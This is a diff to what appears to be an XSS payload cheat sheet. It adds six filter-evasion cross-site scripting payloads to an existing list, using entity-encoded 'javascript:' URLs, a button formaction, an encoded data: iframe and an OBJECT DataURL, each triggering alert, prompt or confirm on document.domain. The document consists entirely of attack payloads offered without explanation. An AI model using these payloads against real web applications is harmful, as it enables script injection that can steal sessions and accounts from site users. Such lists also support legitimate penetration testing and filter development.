@@ -138,6 +138,12 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/*+*/oNcliCk=alert()+)//%0D%0A%0d%0a//</stYle/</
 <form><a href="javascript:\u0061lert(document.domain)">X
 </script><img/*%00/src="worksinchrome&colon;prompt(document.domain)"/%00*/onerror='eval(src)'>
 <style>//*{x:expression(alert(/document.domain/))}//<style></style>
+<img src="/" =_=" title="onerror='prompt(document.domain)'">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa href=j&#97v&#97script:&#97lert(document.domain)>CLICK
+<form><button formaction=javascript&colon;alert(document.domain)>CLICK
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:confirm(document.domain)"></OBJECT>
 ```
 
 ## XSS + SSRF <br>
